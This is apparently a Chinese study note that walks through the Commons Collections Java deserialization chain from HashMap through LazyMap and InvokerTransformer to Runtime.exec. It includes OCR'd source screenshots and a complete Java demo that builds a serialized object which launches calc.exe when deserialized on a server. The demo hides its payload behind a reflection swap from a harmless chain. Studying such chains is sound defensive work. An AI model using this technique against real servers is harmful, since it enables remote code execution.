## 一，链条总览
ObjectInputStream.readobject()

->HashMap.readObject()

->hash(key)

->TiedMapEntry.hashCode()

->getValue(key)

->LazyMap.get(key)

->lazyMap.factory().transform()

->ChainedTransformer().transform()

->InvokerTransformer.invoke()

->Runtime.getRuntime().exec()

## 二，关键类及机制
1.HashMap

HashMap 在插入或元素以及反序列化恢复数据结构时会对 key 进行 hash 确定存储的位置<!-- 这是一张图片，ocr 内容为：POSSIBLE WAY TO REDUCE SYSTEMATIC LOSSAGE, AS WELL AS TO INCORPORATE IMPACT OF THE HIGHEST BITS THAT WOULD OTHERWISE NEVER BE USED IN INDEX CALCULATIONS BECAUSE OF TABLE BOUNDS STATIC FINAL INT HASH(OBJECT KEY) INT H; RETURN (KEY -- NULL) ? 0 : (H - KEY.HASHCODE()) (H >>>>> 16); RETURNS X'S CLASS IF IT IS OF THE FORM"DASS C IMPLEMENTS COMPARABLE",ELSE NULL. -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1780232335820-0eec7041-ee3e-4071-bc2f-0d9b2ea2d692.png)

2.LazyMap

当从 map 中取一个不存在的键时会触发懒加载，调用预定义的工厂函数，LazyMap.decorate(map,factory)

<!-- 这是一张图片，ocr 内容为：PROTECTED LAZYMAP(MAP MAP, TRANSFORMER FACTORY) { SUPER(MAP);  IF (FACTORY - NULL) { THROW NEW ILLEGALARGUMENTEXCEPTION("FACTORY MUST NOT BE NULL"); THIS.FACTORY - FACTORY; WRITE THE MAP OUT USING A CUSTOM ROUTINE. -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1780233604437-3f019b05-176a-4331-ac23-b36502225a50.png)

3.TiedMapEntry

Map.Entry 的一个实现，存储一个 Map 和 key，调用 getValue 时返回 Map.get(key)，而在 hashCode 时会调用 getValue()

<!-- 这是一张图片，ocr 内容为：KEY-THEKEY PUBLIC TIEDMAPENTRY(MAP MAP, OBJECT KEY) { SUPER(); THIS.MAP - MAP; THISKEYKEY; // MAP.ENTRY INTERFACE GETS THE KEY OF THIS ENTRY 返回值:THE KEY PUBLIC OBJECT GETKEY() { RETURN KEY; } GETS THE VALUE OF THIS ENTRY DIRECT FROM THE MAP. 返回值:THE VALUE R PUBLIC OBJECT GETVALUE() { RETURN MAP.GET(KEY); } -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1780232781090-1502876b-9196-4bf7-9806-0c1ab80935a7.png)

4.InvokTransformer

<!-- 这是一张图片，ocr 内容为：INVOKERTRANSTORMER IMPLEMENTS TRANSFORMER, SERIALIZABLE CLASS -THE CONSTRUCTOR ARQUMENTS,NOT CIONED ARGS INVOKERTRANSFORMER(STRING METHODNAME, CLASS[] PARAMTYPES, OBJECT[] ARGS) ( PUBLIC SUPER(); IMETHODNAME METHODNAME; IPARAMTYPES PARAMTYPES; IARGS ARGS; TRANSFORMS THE INPUT TO RESULT BY INVOKING A METHOD ON THE INPUT. 形参:INPUT - THE INPUT OBJECT TO TRANSFORM 返回值:THE TRANSFORMED RESULT,NULL IF NULL INPUT PUBLIC OBJECT TRANSFORM(OBJECT INPUT)  IF (INPUT - NULL) { RETURN NULL; 子 TRY I CLASS CLS - INPUT.GETCLASS(); METHOD METHOD - CLS.GETMETHOD(IMETHODNAME, IPARAMTYPES); RETURN METHOD.INVOKE(INPUT,IARGS); } CATCH (NOSUCHMETHODEXCEPTION EX) { " - INPUT.GETCLASS() THROW NEW FUNCTOREXCEPTION("INVOKERTRANSFORMER: THE RE RE IMETHODNAME METHOD ON (ILLEGALACCESSEXCEPTION EX) { CATCH (I  NAW EUNCTANEYCANTION("TNVOKA , INUT AOTCLASE/) A IME+HODNA -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1780235061163-02368af0-fd6b-4a1c-8ee7-5a619b1bf79d.png)

实现了 Transformer 接口的类，构造函数传入要调用的方法，参数类型，参数数组，在 transform 调用时通过反射获取目标对象对应的帆帆发，并执行调用

5.ChainedTransformer

Transformer 类，存储一个 Transformer 数组，调用 transform 方法时对数组元素逐个调用 transform方法，并将上一个的输出作为下一个方法的输入

<!-- 这是一张图片，ocr 内容为：作者:STEPHEN COLEBOURNE PUBLIC CLASS CHAINEDTRANSFORMER IMPLEMENTS TRANSFORMER, SERIALIZABLE [ SERIAL VERSION UID STATIC FINAL LONG SERIALVERSIONUID AND 3514945074733160196L; THE TRANSFORMERS TO CALL IN TURN PRIVATE FINAL TRANSFORMER[] ITRANSFORMERS; FACTORY METHOD THAT PERFORMS VALIDATION AND COPIES THE PARAMETER ARRAY. 形参:TRANSFORMERS - THE TRANSFORMERS TO CHAIN,COPIED,NO NO NULLS 返回值:THE CHAINED TRANSFORMER - IF THE TRANSFORMERS ARRAY IS NUL ILLEGALARGUMENTEXCEPTION -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1780234095030-e8e43d56-f80f-4776-a561-1e42c12b314b.png)

<!-- 这是一张图片，ocr 内容为：返回值:THE TRANSFORMED RESUIT PUBLIC OBJECT TRANSFORM(OBJECT OBJECT) F UNT I - O; I < ITRANSFORMERS.LENGTH; I++) { FOR (INT I : ITRANSFORMERS[I].TRANSFORM(OBJECT); OBJECT - I RETURN OBJECT; -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1780234144018-e0f4aac1-5ae0-4518-a798-eac91dc35551.png)

6.ConstantTransformer

ConstantTransformer 无论输入是什么，调用 transform 时都直接返回构造时存入的常量对象

<!-- 这是一张图片，ocr 内容为：CONSTANTTRANSFORMER(OBJECT CONSTANTTORETURN) { PUBLIC SUPER(); CONSTANTTORETURN; ICONSTANT 了 TRANSFORMS THE INPUT BY IGNORING IT AND RETURNING THE STORED CONSTANT INSTEAD. 形参:INPUT - THE INPUT OBJECT WHICH IGNORED 返回值:THE STORED CONSTANT PUBLIC OBJECT TRANSFORM(OBJECT INPUT) { RETURN ICONSTANT; ] GETS THE CONSTANT. 返回值:THE CONSTANT COMMONS COLLECTIONS 3.1 自: ICONSTANT; PUBLIC OBJECT GETCONSTANT() { ME RETURN -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1780234589296-600dcbe9-a6ce-4934-ab3e-bf4a7cc1ec56.png)

return iConstant f 安徽构造是保存的固定对象



## 三，详细步骤
1.ObjectInputStream.readobject()

2.反序列化时 HashMap 会对 key 重新进行 hash，确定存储桶的位置

HashMap.readObject()中：

<!-- 这是一张图片，ocr 内容为：TABLE TAB; READ THE KEYS AND VALUES, AND PUT THE MAPPINGS IN THE HASHMAP (INT I - O; I < MAPPINGS; I++) { FOR /UNCHECKED/ K KEY - (K) S.READOBJECT(); /UNCHECKED/  V VALUE ; (V) S.READOBJECT(); ONLYLFABSENT:FALSE, EVICT:FALSE);  PUTVAL(HASH(KEY), KEY, VALUE, -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1780232559770-9a8c55b4-405c-4e82-b8c5-d41075a27f42.png)

将 key 进行重新 hash，恢复整个存储结构

3.TiedMap.hashCode

<!-- 这是一张图片，ocr 内容为：IMPLEMENTED PER API DOCUMENTATION OF MAP. ENTRY.HASHCODE() 返回值:A SUITABLE HASH CODE 1901 PUBLIC INT HASHCODE() {  OBJECT VALUE - GETVALUE(); 20 RETURN (GETKEY() -- NULL ? 0 : GETKEY().HASHCODE()) ' (VALUE - NULL ? 0 : VALUE.HASHCODE()); 22 23 24 GETS A STRING VERSION OF THE ENTRY. -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1780232910587-e4f383b0-0170-44cc-a476-65a12a46f9d1.png)

<!-- 这是一张图片，ocr 内容为：返回值:THEVALUE PUBLIC OBJECT GETVALUE() RETURN MAP.GET(KEY); -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1780232956317-25d58198-047c-42ad-adef-401a6da8b216.png)

TiedMap 进行 hash 时会取出 map 中 key 对应的值进行 hash，当调用 map.getValue()时又会触发 map.get(key）

4.LazyMap.get(key)

<!-- 这是一张图片，ocr 内容为：PUBLIC OBJECT GET(OBJECT KEY){ // CREATE VALUE FOR KEY IF KEY IS NOT CURRENTLY IN THE MAP IF (MAP.CONTAINSKEY(KEY) -- FALSE) { OBJECT VALUE - FACTORY.TRANSFORM(KEY); MAP.PUT(KEY, VALUE); RETURN VALUE; 子 RETURN MAP.GET(KEY); -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1780233693407-b3263189-5803-4ab4-add1-c2134e792113.png)

当调用 LazyMap.get()方法时会先检查 key 是否存在，如果不存在就会调用工厂函数对 key 进行处理，最后将 key，value 重新 put 进 map

5.ChainedTransformer.transformer

<!-- 这是一张图片，ocr 内容为：TRANSFORMER[] EVILCHAIN NEW CONSTANTTRANSFORMER(RUNTIME.CLASS),//拿到RUNTIME.CLASS NEW MYINVOKERTRANSFORMER( METHODNAME:"GETMETHOD", W CLASS[]{STRING.CLASS,CLASS[].CLASS], NEW NEW OBJECT[]"GETRUNTIME",NEW CLASS[O]] ),/上一步的CLASS对象调用GETMETHOD方法拿到GETRUNTIME NEW MYINVOKERTRANSFORMER( METHODNAME:"INVOKE", 4 CLASS[]{OBJECT.CLASS,OBJECT[].CLASS], NEW W OBJECT[LFNULL,NEW OBJECT[O]] NEW OB ),//调用GETRUNTIME拿到RUNTIME实例 NEW MYINVOKERTRANSFORMER( METHODNAME:"EXEC", NEW CLASS[LISTRING.CLASS],  NEW OBJECT[]"CALC.EXE"] //通过EXEC执行命令 -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1780234337720-74a0294a-cc62-4b8f-bd94-6543e24c0ef0.png)



## 四，demo 实现
```plain
package com.transformer;

import javax.lang.model.util.SimpleElementVisitor14;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class Main {
    public static void main(String[] args) throws Exception{
        Transformer[] evilchain={
                new ConstantTransformer(Runtime.class),//拿到Runtime.class
                new MyInvokerTransformer(
                        "getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",new Class[0]}
                ),//上一步的Class对象调用getMethod方法拿到getRuntime
                 new MyInvokerTransformer(
                         "invoke",
                         new Class[]{Object.class,Object[].class},
                         new Object[]{null,new Object[0]}
                 ),//调用getRuntime拿到Runtime实例
                new MyInvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc.exe"}
                )//通过exec执行命令
        };
        //无害链子
        Transformer[] fakechain= {new ConstantTransformer(1)
        };
        //构造阶段执行无害链子不触发命令执行
        ChainedTransformer chained = new ChainedTransformer(fakechain);
        Map map = new HashMap<Integer,String>();

        MiniLazyMap lazyMap=new MiniLazyMap(map,chained );
//        lazyMap.get('a');
//        lazyMap.get(1);
        MiniTiedMapEntry entry=new MiniTiedMapEntry(lazyMap,"test");

        HashMap<Object,Object> triggerMap = new HashMap<>();
        System.out.println("构造阶段，调用hashCode");
        triggerMap.put(entry,"value");

        //lazyMap.get()中key不存在触发链子后会添加key导致后面反序列化不在执行
        lazyMap.remove("test");
        //利用反射动态修改属性替换成恶意链子
        Field field=ChainedTransformer.class.getDeclaredField("transformers");
        field.setAccessible(true);
        field.set(chained,evilchain);
        System.out.println("开始序列化");
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("mini-cc1.ser"));
        oos.writeObject(triggerMap);
        oos.close();

        //反序列化时 HashMap 会重新计算 key 的 hash，触发 key.hashCode()
        //到服务器端反序列化时执行恶意链子
        System.out.println("开始反序列化");
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("mini-cc1.ser"));
        ois.readObject();
        ois.close();

   }
}
```



整个链子通过反序列化触发 HashMap 的 hash 方法（入口不唯一，反序列化时能重新对 key 进行 hash 就行，如 HashSet、HashTable 等），对 HashMap 的 key 重新进行 hash，我们将这个 key 替换成 TiedMapEntry,该类的 hashCode 方法会调用 getValue()->map.getValue(key)，我们只需将 map 替换成一个 LazyMap 类，这样就会执行 LazyMap.get(key),LazyMap 具有懒加载机制，在创建的时候可以通过 LazyMap.decorate(map,factory)传入一个 Transformer 类的工厂类，当调用 get 方法时就会触发工厂类的 transform 方法去对传入的 key 进行处理，因为传入的 key 多半是 String 类型，反正不会是 Runtime 类型，所以我们需要通过 ConstantTransformer 类对 ChainedTransformer 链子 提供一个固定起点，所以传入 ConstantTransfirmer(Runtime.class)，这样后面也会 基于 Runtime 类进行反复的反射调用，知道执行恶意命令，同时工厂类调用过后会重新 put(key,value)，所以在后面还需要 lazyMap.remove(key)，因为开始 hashMap.put()时就会触发 hash，执行整个链子，所以这时就会将本不存在的 key put 进 map，所以需要删除，确保到服务端后能重新触发，同时我们开始时构造一个无害链子，让在本地进行 put 时不触发，然后通过反射替换属性，将无害链子替换成有害链子，防止在本地提前触发利用

